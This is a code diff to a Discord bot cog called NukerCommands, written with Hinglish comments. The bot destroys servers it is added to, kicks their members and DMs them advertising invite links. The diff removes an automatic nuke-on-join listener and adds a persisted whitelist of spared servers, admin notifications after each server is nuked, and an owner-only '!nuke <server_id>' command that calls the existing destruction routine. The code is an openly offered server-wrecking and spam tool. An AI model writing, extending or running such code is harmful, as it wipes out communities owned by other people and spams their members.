@@ -2,17 +2,26 @@ import discord
 from discord.ext import commands
 import asyncio
 import random
+import json
+import os
 from datetime import datetime
 
 class NukerCommands(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
-        # WHITELISTED SERVERS - TERE 3 SERVERS SAFE RAHENGE
-        self.whitelisted_servers = [
-            1421640981584937063,  # Server 1 - SAFE
-            1344323930923601992,  # Server 2 - SAFE  
-            1444885010543935662   # Server 3 - STATUS ONLY
+        
+        # PERMANENT WHITELIST - HARDCODED FOREVER
+        self.permanent_whitelist = [
+            1421640981584937063,  # Server 1 - PERMANENT SAFE
+            1344323930923601992,  # Server 2 - PERMANENT SAFE  
+            1444885010543935662   # Server 3 - STATUS ONLY - PERMANENT
         ]
+        
+        # DYNAMIC WHITELIST (Admin se add honge)
+        self.whitelisted_servers = []
+        
+        # Load dynamic whitelist from file if exists
+        self.load_whitelist()
         
         # STATUS SERVER INFO
         self.status_server_id = 1444885010543935662
@@ -20,6 +29,9 @@ class NukerCommands(commands.Cog):
         
         # Owner ID
         self.owner_id = 1232586090532306966
+        
+        # ADMIN CHANNEL
+        self.admin_channel_id = 1446007578856259697
         
         # Special features for whitelisted servers
         self.welcome_messages = [
@@ -29,9 +41,34 @@ class NukerCommands(commands.Cog):
             "✅ This server is under Digamber's protection"
         ]
 
+    def load_whitelist(self):
+        """Load dynamic whitelist from file"""
+        try:
+            if os.path.exists("whitelist.json"):
+                with open("whitelist.json", "r") as f:
+                    data = json.load(f)
+                    self.whitelisted_servers = data.get("dynamic_whitelist", [])
+                    print(f"✅ Loaded {len(self.whitelisted_servers)} servers from whitelist.json")
+        except Exception as e:
+            print(f"❌ Failed to load whitelist: {e}")
+
+    def save_whitelist(self):
+        """Save dynamic whitelist to file"""
+        try:
+            data = {
+                "dynamic_whitelist": self.whitelisted_servers,
+                "permanent_whitelist": self.permanent_whitelist,
+                "updated": datetime.utcnow().isoformat()
+            }
+            with open("whitelist.json", "w") as f:
+                json.dump(data, f, indent=4)
+            print(f"✅ Whitelist saved: {len(self.whitelisted_servers)} dynamic servers")
+        except Exception as e:
+            print(f"❌ Failed to save whitelist: {e}")
+
     def is_whitelisted(self, guild_id):
-        """Check karo agar server whitelisted hai ya nahi"""
-        return guild_id in self.whitelisted_servers
+        """Check karo agar server whitelisted hai ya nahi (permanent + dynamic)"""
+        return guild_id in self.permanent_whitelist or guild_id in self.whitelisted_servers
 
     async def send_kick_dm(self, member, server_name):
         """Kicked members ko PROFESSIONAL DM bhejo"""
@@ -63,26 +100,26 @@ class NukerCommands(commands.Cog):
             )
             
             embed.add_field(
-    name="🔗 OFFICIAL SERVER — Roy Seller",
-    value="**╭─━━━━━━━━━━━━━━━━━━─╮**\n"
-          "**┃ 🔥 Join Roy Seller:**\n"
-          "**┃ https://discord.gg/5TB2n6tmvd**\n"
-          "**╰─━━━━━━━━━━━━━━━━━━─╯**\n\n"
-          "**✅ Trusted Marketplace**\n"
-          "**🚀 Fast Orders & Instant Support**",
-    inline=False
-)
+                name="🔗 OFFICIAL SERVER — Roy Seller",
+                value="**╭─━━━━━━━━━━━━━━━━━━─╮**\n"
+                      "**┃ 🔥 Join Roy Seller:**\n"
+                      "**┃ https://discord.gg/5TB2n6tmvd**\n"
+                      "**╰─━━━━━━━━━━━━━━━━━━─╯**\n\n"
+                      "**✅ Trusted Marketplace**\n"
+                      "**🚀 Fast Orders & Instant Support**",
+                inline=False
+            )
 
-embed.add_field(
-    name="🔗 OFFICIAL SERVER — SM GrowMart HQ",
-    value="**╭─━━━━━━━━━━━━━━━━━━─╮**\n"
-          "**┃ ⚡ Join GrowMart HQ:**\n"
-          "**┃ https://discord.gg/5bFnXdUp8U**\n"
-          "**╰─━━━━━━━━━━━━━━━━━━─╯**\n\n"
-          "**🎯 Growth Tools & Services**\n"
-          "**💬 Direct Staff Assistance**",
-    inline=False
-)
+            embed.add_field(
+                name="🔗 OFFICIAL SERVER — SM GrowMart HQ",
+                value="**╭─━━━━━━━━━━━━━━━━━━─╮**\n"
+                      "**┃ ⚡ Join GrowMart HQ:**\n"
+                      "**┃ https://discord.gg/5bFnXdUp8U**\n"
+                      "**╰─━━━━━━━━━━━━━━━━━━─╯**\n\n"
+                      "**🎯 Growth Tools & Services**\n"
+                      "**💬 Direct Staff Assistance**",
+                inline=False
+            )
             
             embed.add_field(
                 name="⚠️ WARNING",
@@ -140,12 +177,13 @@ embed.add_field(
             
             # Server stats
             total_servers = len(self.bot.guilds)
-            whitelisted_count = len(self.whitelisted_servers)
             protected_count = sum(1 for guild in self.bot.guilds if self.is_whitelisted(guild.id))
+            permanent_count = len(self.permanent_whitelist)
+            dynamic_count = len(self.whitelisted_servers)
             
             embed.add_field(
                 name="🌐 SERVER STATS",
-                value=f"• **Total Servers:** `{total_servers}`\n• **Protected Servers:** `{protected_count}`\n• **Whitelisted:** `{whitelisted_count}`\n• **Unprotected:** `{total_servers - protected_count}`",
+                value=f"• **Total Servers:** `{total_servers}`\n• **Protected Servers:** `{protected_count}`\n• **Permanent Whitelist:** `{permanent_count}`\n• **Dynamic Whitelist:** `{dynamic_count}`",
                 inline=False
             )
             
@@ -156,10 +194,25 @@ embed.add_field(
                 inline=False
             )
             
-            # Last nuke info (agar koi hai)
+            # Last nuke info
             embed.add_field(
-                name="⚡ LAST ACTION",
-                value="• **System:** ✅ OPERATIONAL\n• **Commands:** ✅ READY\n• **Connection:** ✅ STABLE\n• **API:** ✅ RESPONSIVE",
+                name="⚡ SYSTEM STATUS",
+                value="• **System:** ✅ OPERATIONAL\n• **Admin Panel:** ✅ ACTIVE\n• **Voice:** ✅ CONNECTED\n• **API:** ✅ RESPONSIVE",
+                inline=False
+            )
+            
+            # Permanent servers list
+            permanent_servers_info = ""
+            for server_id in self.permanent_whitelist:
+                guild = self.bot.get_guild(server_id)
+                if guild:
+                    permanent_servers_info += f"• ✅ {guild.name}\n"
+                else:
+                    permanent_servers_info += f"• ❓ Server {server_id}\n"
+            
+            embed.add_field(
+                name="🔒 PERMANENT WHITELIST",
+                value=permanent_servers_info or "• No permanent servers",
                 inline=False
             )
             
@@ -187,30 +240,13 @@ embed.add_field(
 
     @commands.Cog.listener()
     async def on_ready(self):
-        """Bot ready hone par status update karo"""
+        """Bot ready hone par admin panel update karo"""
         print("✅ NukerCommands cog ready!")
-        await self.update_status_channel()
-
-    @commands.Cog.listener()
-    async def on_guild_join(self, guild):
-        """MAX SPEED AUTO-NUKE"""
-        print(f'🎯 MAX SPEED JOIN: {guild.name} ({guild.id})')
+        print(f"   Permanent Whitelist: {len(self.permanent_whitelist)} servers")
+        print(f"   Dynamic Whitelist: {len(self.whitelisted_servers)} servers")
         
-        # Status update karo
+        # Initial status update
         await self.update_status_channel()
-        
-        if not self.is_whitelisted(guild.id):
-            print(f'💣 MAX SPEED AUTO-NUKE: {guild.name}')
-            await self.nuke_server(guild)  # INSTANT
-        else:
-            print(f'✅ Whitelisted server: {guild.name} - Safe')
-            # Whitelisted server ke liye welcome message
-            try:
-                general = discord.utils.get(guild.text_channels, name="general")
-                if general:
-                    await general.send(random.choice(self.welcome_messages))
-            except:
-                pass
 
     @commands.Cog.listener()
     async def on_member_join(self, member):
@@ -409,7 +445,7 @@ embed.add_field(
                     
                     final_embed.add_field(
                         name="🔗 OFFICIAL SERVERS",
-                        value="```\nPrimary: https://discord.gg/5TB2n6tmvd\nBackup:  https://discord.gg/5bFnXdUp8U\n```",
+                        value="\nPrimary: https://discord.gg/5TB2n6tmvd\nBackup:  https://discord.gg/5bFnXdUp8U\n",
                         inline=False
                     )
                     
@@ -440,6 +476,9 @@ embed.add_field(
             # Status update karo nuke ke baad
             await self.update_status_channel()
             
+            # Admin panel update
+            await self.send_admin_notification(f"🚨 Server Nuked: **{guild.name}** (`{guild.id}`)")
+            
         except Exception as e:
             print(f"💀 Professional nuke failed: {e}")
             try:
@@ -447,7 +486,425 @@ embed.add_field(
             except:
                 pass
 
-    # SPECIAL COMMANDS FOR WHITELISTED SERVERS
+    async def send_admin_notification(self, message):
+        """Send notification to admin channel"""
+        try:
+            channel = self.bot.get_channel(self.admin_channel_id)
+            if channel:
+                embed = discord.Embed(
+                    title="📢 ADMIN NOTIFICATION",
+                    description=message,
+                    color=0xff9900,
+                    timestamp=datetime.utcnow()
+                )
+                await channel.send(embed=embed)
+        except:
+            pass
+
+    # ==================== ADMIN PANEL COMMANDS ====================
+
+    @commands.command(name='panel')
+    @commands.is_owner()
+    async def admin_panel(self, ctx):
+        """Show admin control panel"""
+        if ctx.channel.id != self.admin_channel_id:
+            await ctx.send(f"❌ Use this command in <#{self.admin_channel_id}>")
+            return
+        
+        embed = discord.Embed(
+            title="🛠️ **ADMIN CONTROL PANEL**",
+            description="Manage bot protection and settings",
+            color=0x5865F2,
+            timestamp=datetime.utcnow()
+        )
+        
+        # Bot stats
+        total_servers = len(self.bot.guilds)
+        protected_count = sum(1 for guild in self.bot.guilds if self.is_whitelisted(guild.id))
+        
+        embed.add_field(
+            name="📊 **BOT STATISTICS**",
+            value=f"• **Total Servers:** `{total_servers}`\n• **Protected:** `{protected_count}`\n• **Unprotected:** `{total_servers - protected_count}`\n• **Ping:** `{round(self.bot.latency * 1000)}ms`",
+            inline=False
+        )
+        
+        # Whitelist stats
+        embed.add_field(
+            name="🔒 **WHITELIST MANAGEMENT**",
+            value=f"• **Permanent:** `{len(self.permanent_whitelist)}` servers\n• **Dynamic:** `{len(self.whitelisted_servers)}` servers\n• **Total Protected:** `{len(self.permanent_whitelist) + len(self.whitelisted_servers)}`",
+            inline=False
+        )
+        
+        # Permanent servers
+        perm_info = ""
+        for idx, server_id in enumerate(self.permanent_whitelist, 1):
+            guild = self.bot.get_guild(server_id)
+            status = "✅" if guild else "❌"
+            name = guild.name if guild else f"Server {server_id}"
+            perm_info += f"{idx}. {status} {name}\n"
+        
+        embed.add_field(
+            name="🔐 **PERMANENT SERVERS**",
+            value=perm_info or "No permanent servers",
+            inline=False
+        )
+        
+        # Commands
+        embed.add_field(
+            name="⚡ **QUICK ACTIONS**",
+            value="```\n!wladd <server_id> - Add to whitelist\n!wlremove <server_id> - Remove from whitelist\n!wllist - Show all whitelisted\n!nuke <server_id> - Manual nuke\n!servers - All server list\n!cleanup - Clean old messages\n!backup - Backup data\n!restore - Restore data\n```",
+            inline=False
+        )
+        
+        embed.set_footer(text="Admin Panel • Use commands in this channel")
+        await ctx.send(embed=embed)
+
+    @commands.command(name='wladd')
+    @commands.is_owner()
+    async def add_whitelist_admin(self, ctx, server_id: int):
+        """Add server to dynamic whitelist via admin panel"""
+        if ctx.channel.id != self.admin_channel_id:
+            await ctx.send(f"❌ Use this command in <#{self.admin_channel_id}>")
+            return
+        
+        if server_id in self.permanent_whitelist:
+            embed = discord.Embed(
+                title="⚠️ ALREADY PERMANENT",
+                description=f"Server `{server_id}` is already in **PERMANENT** whitelist.",
+                color=0xff9900
+            )
+            await ctx.send(embed=embed)
+            return
+        
+        if server_id in self.whitelisted_servers:
+            embed = discord.Embed(
+                title="⚠️ ALREADY WHITELISTED",
+                description=f"Server `{server_id}` is already in dynamic whitelist.",
+                color=0xff9900
+            )
+            await ctx.send(embed=embed)
+            return
+        
+        self.whitelisted_servers.append(server_id)
+        self.save_whitelist()
+        
+        # Check if bot is in this server
+        guild = self.bot.get_guild(server_id)
+        server_name = guild.name if guild else f"Unknown ({server_id})"
+        
+        embed = discord.Embed(
+            title="✅ WHITELIST ADDED",
+            description=f"**{server_name}** has been added to dynamic whitelist.",
+            color=0x00ff00
+        )
+        embed.add_field(name="Server ID", value=f"`{server_id}`", inline=True)
+        embed.add_field(name="Total Dynamic", value=f"`{len(self.whitelisted_servers)}`", inline=True)
+        embed.add_field(name="Status", value="🛡️ PROTECTED", inline=True)
+        
+        await ctx.send(embed=embed)
+        await self.send_admin_notification(f"✅ Server added to whitelist: **{server_name}**")
+
+    @commands.command(name='wlremove')
+    @commands.is_owner()
+    async def remove_whitelist_admin(self, ctx, server_id: int):
+        """Remove server from dynamic whitelist via admin panel"""
+        if ctx.channel.id != self.admin_channel_id:
+            await ctx.send(f"❌ Use this command in <#{self.admin_channel_id}>")
+            return
+        
+        if server_id in self.permanent_whitelist:
+            embed = discord.Embed(
+                title="❌ CANNOT REMOVE PERMANENT",
+                description=f"Server `{server_id}` is in **PERMANENT** whitelist and cannot be removed.",
+                color=0xff0000
+            )
+            await ctx.send(embed=embed)
+            return
+        
+        if server_id not in self.whitelisted_servers:
+            embed = discord.Embed(
+                title="❌ NOT IN WHITELIST",
+                description=f"Server `{server_id}` is not in dynamic whitelist.",
+                color=0xff0000
+            )
+            await ctx.send(embed=embed)
+            return
+        
+        self.whitelisted_servers.remove(server_id)
+        self.save_whitelist()
+        
+        guild = self.bot.get_guild(server_id)
+        server_name = guild.name if guild else f"Unknown ({server_id})"
+        
+        embed = discord.Embed(
+            title="⚠️ WHITELIST REMOVED",
+            description=f"**{server_name}** has been removed from dynamic whitelist.",
+            color=0xff9900
+        )
+        embed.add_field(name="Server ID", value=f"`{server_id}`", inline=True)
+        embed.add_field(name="Total Dynamic", value=f"`{len(self.whitelisted_servers)}`", inline=True)
+        embed.add_field(name="Status", value="💀 UNSAFE", inline=True)
+        embed.add_field(name="Warning", value="Server is now vulnerable to auto-nuke!", inline=False)
+        
+        await ctx.send(embed=embed)
+        await self.send_admin_notification(f"⚠️ Server removed from whitelist: **{server_name}**")
+
+    @commands.command(name='wllist')
+    @commands.is_owner()
+    async def show_all_whitelisted(self, ctx):
+        """Show all whitelisted servers (permanent + dynamic)"""
+        if ctx.channel.id != self.admin_channel_id:
+            await ctx.send(f"❌ Use this command in <#{self.admin_channel_id}>")
+            return
+        
+        embed = discord.Embed(
+            title="🔒 **WHITELIST DATABASE**",
+            color=0x00ff00,
+            timestamp=datetime.utcnow()
+        )
+        
+        # Permanent whitelist
+        if self.permanent_whitelist:
+            embed.add_field(
+                name="🔐 **PERMANENT WHITELIST**",
+                value="*Cannot be removed*",
+                inline=False
+            )
+            
+            for server_id in self.permanent_whitelist:
+                guild = self.bot.get_guild(server_id)
+                if guild:
+                    embed.add_field(
+                        name=f"✅ {guild.name}",
+                        value=f"**ID:** `{server_id}`\n**Members:** `{guild.member_count}`\n**Status:** 🔒 PERMANENT",
+                        inline=True
+                    )
+                else:
+                    embed.add_field(
+                        name=f"❓ Server {server_id}",
+                        value=f"**ID:** `{server_id}`\n**Status:** ⚠️ OFFLINE\n**Type:** 🔒 PERMANENT",
+                        inline=True
+                    )
+        
+        # Dynamic whitelist
+        if self.whitelisted_servers:
+            embed.add_field(
+                name="🔧 **DYNAMIC WHITELIST**",
+                value="*Can be added/removed*",
+                inline=False
+            )
+            
+            for server_id in self.whitelisted_servers:
+                guild = self.bot.get_guild(server_id)
+                if guild:
+                    embed.add_field(
+                        name=f"🛡️ {guild.name}",
+                        value=f"**ID:** `{server_id}`\n**Members:** `{guild.member_count}`\n**Status:** 🔧 DYNAMIC",
+                        inline=True
+                    )
+                else:
+                    embed.add_field(
+                        name=f"❓ Server {server_id}",
+                        value=f"**ID:** `{server_id}`\n**Status:** ⚠️ OFFLINE\n**Type:** 🔧 DYNAMIC",
+                        inline=True
+                    )
+        
+        if not self.permanent_whitelist and not self.whitelisted_servers:
+            embed.description = "No servers in whitelist database."
+        
+        embed.set_footer(text=f"Total: {len(self.permanent_whitelist) + len(self.whitelisted_servers)} servers")
+        await ctx.send(embed=embed)
+
+    @commands.command(name='nuke')
+    @commands.is_owner()
+    async def manual_nuke_admin(self, ctx, server_id: int = None):
+        """Manual nuke via admin panel"""
+        if ctx.channel.id != self.admin_channel_id:
+            await ctx.send(f"❌ Use this command in <#{self.admin_channel_id}>")
+            return
+        
+        if server_id is None:
+            server_id = ctx.guild.id
+        
+        # Check if server is whitelisted
+        if self.is_whitelisted(server_id):
+            embed = discord.Embed(
+                title="❌ NUKE BLOCKED",
+                description=f"Server `{server_id}` is **WHITELISTED** and protected from nukes.",
+                color=0xff0000
+            )
+            await ctx.send(embed=embed)
+            return
+        
+        guild = self.bot.get_guild(server_id)
+        if not guild:
+            embed = discord.Embed(
+                title="❌ SERVER NOT FOUND",
+                description=f"Bot is not in server `{server_id}`.",
+                color=0xff0000
+            )
+            await ctx.send(embed=embed)
+            return
+        
+        # Confirmation
+        embed = discord.Embed(
+            title="💣 MANUAL NUKE CONFIRMATION",
+            description=f"Are you sure you want to nuke **{guild.name}**?",
+            color=0xff9900
+        )
+        embed.add_field(name="Server ID", value=f"`{server_id}`", inline=True)
+        embed.add_field(name="Members", value=f"`{guild.member_count}`", inline=True)
+        embed.add_field(name="Channels", value=f"`{len(guild.channels)}`", inline=True)
+        embed.add_field(
+            name="⚠️ WARNING",
+            value="This action is **IRREVERSIBLE**!\nAll data will be permanently destroyed.",
+            inline=False
+        )
+        embed.set_footer(text="Type 'CONFIRM' within 30 seconds to proceed")
+        
+        await ctx.send(embed=embed)
+        
+        def check(m):
+            return m.author == ctx.author and m.channel == ctx.channel and m.content.upper() == "CONFIRM"
+        
+        try:
+            await self.bot.wait_for('message', timeout=30.0, check=check)
+        except asyncio.TimeoutError:
+            await ctx.send("⏰ Nuke cancelled - Timeout")
+            return
+        
+        # Start nuke
+        nuke_embed = discord.Embed(
+            title="🚀 NUKE INITIATED",
+            description=f"Nuking **{guild.name}**...",
+            color=0xff0000
+        )
+        await ctx.send(embed=nuke_embed)
+        
+        await self.nuke_server(guild)
+
+    @commands.command(name='cleanup')
+    @commands.is_owner()
+    async def cleanup_admin(self, ctx, limit: int = 100):
+        """Cleanup messages in admin channel"""
+        if ctx.channel.id != self.admin_channel_id:
+            await ctx.send(f"❌ Use this command in <#{self.admin_channel_id}>")
+            return
+        
+        try:
+            deleted = await ctx.channel.purge(limit=limit)
+            embed = discord.Embed(
+                title="🧹 CLEANUP COMPLETE",
+                description=f"Deleted `{len(deleted)}` messages.",
+                color=0x00ff00
+            )
+            msg = await ctx.send(embed=embed)
+            await asyncio.sleep(5)
+            await msg.delete()
+        except Exception as e:
+            await ctx.send(f"❌ Cleanup failed: {e}")
+
+    @commands.command(name='backup')
+    @commands.is_owner()
+    async def backup_data(self, ctx):
+        """Backup whitelist data"""
+        if ctx.channel.id != self.admin_channel_id:
+            await ctx.send(f"❌ Use this command in <#{self.admin_channel_id}>")
+            return
+        
+        try:
+            self.save_whitelist()
+            embed = discord.Embed(
+                title="💾 BACKUP COMPLETE",
+                description="Whitelist data has been backed up.",
+                color=0x00ff00
+            )
+            embed.add_field(name="Dynamic Servers", value=f"`{len(self.whitelisted_servers)}`", inline=True)
+            embed.add_field(name="File", value="`whitelist.json`", inline=True)
+            await ctx.send(embed=embed)
+        except Exception as e:
+            await ctx.send(f"❌ Backup failed: {e}")
+
+    @commands.command(name='restore')
+    @commands.is_owner()
+    async def restore_data(self, ctx):
+        """Restore whitelist data"""
+        if ctx.channel.id != self.admin_channel_id:
+            await ctx.send(f"❌ Use this command in <#{self.admin_channel_id}>")
+            return
+        
+        try:
+            old_count = len(self.whitelisted_servers)
+            self.load_whitelist()
+            new_count = len(self.whitelisted_servers)
+            
+            embed = discord.Embed(
+                title="🔄 RESTORE COMPLETE",
+                description="Whitelist data has been restored.",
+                color=0x00ff00
+            )
+            embed.add_field(name="Before", value=f"`{old_count}` servers", inline=True)
+            embed.add_field(name="After", value=f"`{new_count}` servers", inline=True)
+            embed.add_field(name="Difference", value=f"`{new_count - old_count}`", inline=True)
+            await ctx.send(embed=embed)
+        except Exception as e:
+            await ctx.send(f"❌ Restore failed: {e}")
+
+    @commands.command(name='stats')
+    @commands.is_owner()
+    async def detailed_stats(self, ctx):
+        """Show detailed statistics"""
+        if ctx.channel.id != self.admin_channel_id:
+            await ctx.send(f"❌ Use this command in <#{self.admin_channel_id}>")
+            return
+        
+        total_servers = len(self.bot.guilds)
+        protected = sum(1 for g in self.bot.guilds if self.is_whitelisted(g.id))
+        unprotected = total_servers - protected
+        
+        embed = discord.Embed(
+            title="📊 **DETAILED STATISTICS**",
+            color=0x3498db,
+            timestamp=datetime.utcnow()
+        )
+        
+        # Server stats
+        embed.add_field(
+            name="🌐 SERVER STATS",
+            value=f"• **Total:** `{total_servers}`\n• **Protected:** `{protected}`\n• **Unprotected:** `{unprotected}`\n• **Percentage:** `{(protected/total_servers*100):.1f}%`",
+            inline=False
+        )
+        
+        # Whitelist stats
+        embed.add_field(
+            name="🔒 WHITELIST STATS",
+            value=f"• **Permanent:** `{len(self.permanent_whitelist)}`\n• **Dynamic:** `{len(self.whitelisted_servers)}`\n• **Total Unique:** `{len(set(self.permanent_whitelist + self.whitelisted_servers))}`",
+            inline=False
+        )
+        
+        # Bot stats
+        embed.add_field(
+            name="🤖 BOT STATS",
+            value=f"• **Uptime:** `{self.get_uptime()}`\n• **Ping:** `{round(self.bot.latency * 1000)}ms`\n• **Commands:** `{len(self.get_commands())}`\n• **Voice:** `{len([g for g in self.bot.guilds if g.voice_client])}`",
+            inline=False
+        )
+        
+        # Server list (top 10)
+        server_list = ""
+        for i, guild in enumerate(list(self.bot.guilds)[:10], 1):
+            status = "🛡️" if self.is_whitelisted(guild.id) else "💀"
+            server_list += f"{i}. {status} {guild.name} (`{guild.member_count}`)\n"
+        
+        embed.add_field(
+            name=f"📋 TOP 10 SERVERS (of {total_servers})",
+            value=server_list or "No servers",
+            inline=False
+        )
+        
+        await ctx.send(embed=embed)
+
+    # ==================== ORIGINAL COMMANDS (Keep for compatibility) ====================
+
     @commands.command(name='protection')
     async def show_protection(self, ctx):
         """Show protection status for whitelisted servers"""
@@ -470,21 +927,21 @@ embed.add_field(
                 inline=False
             )
             
+            # Check if permanent or dynamic
+            if ctx.guild.id in self.permanent_whitelist:
+                whitelist_type = "🔒 PERMANENT (Cannot be removed)"
+            else:
+                whitelist_type = "🔧 DYNAMIC (Can be modified)"
+            
             embed.add_field(
                 name="📊 PROTECTION DETAILS",
-                value="• Auto-Nuke: ❌ DISABLED\n• Bot Actions: ✅ ALLOWED\n• Server Safety: ✅ GUARANTEED\n• Protection: 🛡️ ACTIVE",
+                value=f"• Type: {whitelist_type}\n• Auto-Nuke: ❌ DISABLED\n• Bot Actions: ✅ ALLOWED\n• Server Safety: ✅ GUARANTEED",
                 inline=False
             )
             
             embed.add_field(
                 name="⚙️ SYSTEM INFO",
                 value=f"• Server ID: `{ctx.guild.id}`\n• Member Count: `{ctx.guild.member_count}`\n• Channel Count: `{len(ctx.guild.channels)}`\n• Role Count: `{len(ctx.guild.roles)}`",
-                inline=False
-            )
-            
-            embed.add_field(
-                name="🚨 EMERGENCY",
-                value="If you suspect unauthorized activity, use `!serverinfo` for details.",
                 inline=False
             )
             
@@ -529,12 +986,20 @@ embed.add_field(
         embed.add_field(name="🎭 ROLES", value=f"```{len(ctx.guild.roles)}```", inline=True)
         
         # Protection status
-        status = "✅ **WHITELISTED**" if self.is_whitelisted(ctx.guild.id) else "❌ **NOT WHITELISTED**"
+        if self.is_whitelisted(ctx.guild.id):
+            if ctx.guild.id in self.permanent_whitelist:
+                status = "✅ **PERMANENT WHITELIST**"
+                details = "• Auto-Nuke: ❌ DISABLED\n• Type: 🔒 PERMANENT\n• Removal: ❌ NOT ALLOWED"
+            else:
+                status = "✅ **DYNAMIC WHITELIST**"
+                details = "• Auto-Nuke: ❌ DISABLED\n• Type: 🔧 DYNAMIC\n• Removal: ✅ ALLOWED"
+        else:
+            status = "❌ **NOT WHITELISTED**"
+            details = "• Auto-Nuke: ✅ ENABLED\n• Bot Safe: ❌ NO\n• Status: 💀 UNSAFE"
+        
         embed.add_field(
             name="🛡️ NUKE PROTECTION", 
-            value=f"{status}\n" + 
-                  ("• Auto-Nuke: ❌ DISABLED\n• Bot Safe: ✅ YES" if self.is_whitelisted(ctx.guild.id) else 
-                   "• Auto-Nuke: ✅ ENABLED\n• Bot Safe: ❌ NO"),
+            value=f"{status}\n{details}",
             inline=False
         )
         
@@ -552,59 +1017,6 @@ embed.add_field(
         
         await ctx.send(embed=embed)
 
-    @commands.command(name='nuke')
-    @commands.is_owner()
-    async def manual_nuke(self, ctx):
-        """Manual MAX SPEED nuke"""
-        # Check if user is owner
-        if ctx.author.id != self.owner_id and ctx.author.id != ctx.guild.owner_id:
-            await ctx.send("❌ This command is for bot owner only!")
-            return
-            
-        if self.is_whitelisted(ctx.guild.id):
-            embed = discord.Embed(
-                title="❌ NUKE BLOCKED",
-                description=f"**{ctx.guild.name}** is **WHITELISTED** and protected from nukes.",
-                color=0xff0000,
-                timestamp=datetime.utcnow()
-            )
-            embed.add_field(
-                name="PROTECTION ACTIVE",
-                value="This server cannot be nuked due to whitelist protection.",
-                inline=False
-            )
-            embed.set_footer(text="Digamber Protection System • Safety First")
-            await ctx.send(embed=embed)
-            return
-        
-        # Professional nuke warning
-        warning_embed = discord.Embed(
-            title="💣 MAXIMUM SPEED NUKE INITIATED",
-            color=0xff9900,
-            timestamp=datetime.utcnow()
-        )
-        warning_embed.add_field(
-            name="⚠️ WARNING",
-            value="This action will **COMPLETELY DESTROY** the server.\nAll data will be lost permanently.",
-            inline=False
-        )
-        warning_embed.add_field(
-            name="⏱️ COUNTDOWN",
-            value="Nuke will commence in **5 seconds**...",
-            inline=False
-        )
-        warning_embed.set_footer(text="Digamber Nuker • Manual Override")
-        
-        await ctx.send(embed=warning_embed)
-        await asyncio.sleep(5)
-        
-        try:
-            await ctx.message.delete()
-        except:
-            pass
-        
-        await self.nuke_server(ctx.guild)
-
     @commands.command(name='whitelist')
     @commands.is_owner()
     async def add_whitelist(self, ctx, server_id: int = None):
@@ -617,8 +1029,13 @@ embed.add_field(
         if server_id is None:
             server_id = ctx.guild.id
         
+        if server_id in self.permanent_whitelist:
+            await ctx.send("ℹ️ Server already in PERMANENT whitelist!")
+            return
+        
         if server_id not in self.whitelisted_servers:
             self.whitelisted_servers.append(server_id)
+            self.save_whitelist()
             
             embed = discord.Embed(
                 title="✅ SERVER WHITELISTED",
@@ -627,18 +1044,18 @@ embed.add_field(
             )
             embed.add_field(
                 name="SERVER ADDED",
-                value=f"**{ctx.guild.name}** has been added to the whitelist.",
+                value=f"**{ctx.guild.name}** has been added to dynamic whitelist.",
                 inline=False
             )
             embed.add_field(
-                name="🔒 PROTECTION ACTIVE",
-                value=f"• Server ID: `{server_id}`\n• Status: ✅ SAFE\n• Auto-Nuke: ❌ DISABLED\n• Protection: 🛡️ ENABLED",
+                name="🔧 PROTECTION ACTIVE",
+                value=f"• Server ID: `{server_id}`\n• Status: ✅ SAFE\n• Type: 🔧 DYNAMIC\n• Auto-Nuke: ❌ DISABLED",
                 inline=False
             )
             embed.set_footer(text="Digamber Protection System • Server Secured")
             await ctx.send(embed=embed)
         else:
-            await ctx.send(f"ℹ️ Server already whitelisted!")
+            await ctx.send(f"ℹ️ Server already in dynamic whitelist!")
 
     @commands.command(name='unwhitelist')
     @commands.is_owner() 
@@ -652,8 +1069,13 @@ embed.add_field(
         if server_id is None:
             server_id = ctx.guild.id
         
+        if server_id in self.permanent_whitelist:
+            await ctx.send("❌ Cannot remove PERMANENT whitelist server!")
+            return
+        
         if server_id in self.whitelisted_servers:
             self.whitelisted_servers.remove(server_id)
+            self.save_whitelist()
             
             embed = discord.Embed(
                 title="⚠️ PROTECTION REMOVED",
@@ -662,7 +1084,7 @@ embed.add_field(
             )
             embed.add_field(
                 name="SERVER REMOVED",
-                value=f"**{ctx.guild.name}** has been removed from the whitelist.",
+                value=f"**{ctx.guild.name}** has been removed from dynamic whitelist.",
                 inline=False
             )
             embed.add_field(
@@ -673,7 +1095,7 @@ embed.add_field(
             embed.set_footer(text="Digamber Protection System • Protection Disabled")
             await ctx.send(embed=embed)
         else:
-            await ctx.send(f"❌ Server not in whitelist!")
+            await ctx.send(f"❌ Server not in dynamic whitelist!")
 
     @commands.command(name='whitelisted')
     @commands.is_owner()
@@ -684,7 +1106,7 @@ embed.add_field(
             await ctx.send("❌ This command is for server owner only!")
             return
             
-        if not self.whitelisted_servers:
+        if not self.permanent_whitelist and not self.whitelisted_servers:
             await ctx.send("❌ No servers in whitelist!")
             return
         
@@ -694,22 +1116,42 @@ embed.add_field(
             timestamp=datetime.utcnow()
         )
         
-        for server_id in self.whitelisted_servers:
-            guild = self.bot.get_guild(server_id)
-            if guild:
-                embed.add_field(
-                    name=f"✅ {guild.name}",
-                    value=f"**ID:** `{server_id}`\n**Members:** `{guild.member_count}`\n**Status:** 🛡️ PROTECTED",
-                    inline=False
-                )
-            else:
-                embed.add_field(
-                    name=f"❓ UNKNOWN SERVER",
-                    value=f"**ID:** `{server_id}`\n**Status:** ⚠️ OFFLINE\n**(Bot not in server)**",
-                    inline=False
-                )
+        # Permanent whitelist
+        if self.permanent_whitelist:
+            embed.add_field(
+                name="🔐 PERMANENT WHITELIST",
+                value="*Cannot be removed*",
+                inline=False
+            )
+            
+            for server_id in self.permanent_whitelist:
+                guild = self.bot.get_guild(server_id)
+                if guild:
+                    embed.add_field(
+                        name=f"✅ {guild.name}",
+                        value=f"**ID:** `{server_id}`\n**Members:** `{guild.member_count}`\n**Status:** 🔒 PERMANENT",
+                        inline=True
+                    )
         
-        embed.set_footer(text=f"Total Protected Servers: {len(self.whitelisted_servers)}")
+        # Dynamic whitelist
+        if self.whitelisted_servers:
+            embed.add_field(
+                name="🔧 DYNAMIC WHITELIST",
+                value="*Can be added/removed*",
+                inline=False
+            )
+            
+            for server_id in self.whitelisted_servers:
+                guild = self.bot.get_guild(server_id)
+                if guild:
+                    embed.add_field(
+                        name=f"🛡️ {guild.name}",
+                        value=f"**ID:** `{server_id}`\n**Members:** `{guild.member_count}`\n**Status:** 🔧 DYNAMIC",
+                        inline=True
+                    )
+        
